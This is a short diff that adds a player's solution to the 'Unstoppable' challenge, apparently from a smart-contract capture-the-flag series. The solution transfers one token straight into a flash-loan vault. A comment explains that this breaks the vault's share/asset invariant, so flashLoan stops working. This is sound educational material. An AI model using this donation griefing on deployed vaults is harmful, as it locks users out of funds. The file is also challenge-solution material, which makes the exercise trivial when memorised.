@@ -91,7 +91,12 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        /*Transferring any amount to the vault breaks the flashLoan function.
+        Transferring ERC20 doesn't iuncrease totalSupply, but balanceOf the contract does.
+        Therefore, at the start, totalSupply = totalAssets. But transferring
+        changes it: totalSupply != totalAssets + 1
+        */
+        token.transfer(address(vault), 1);
     }
 
     /**
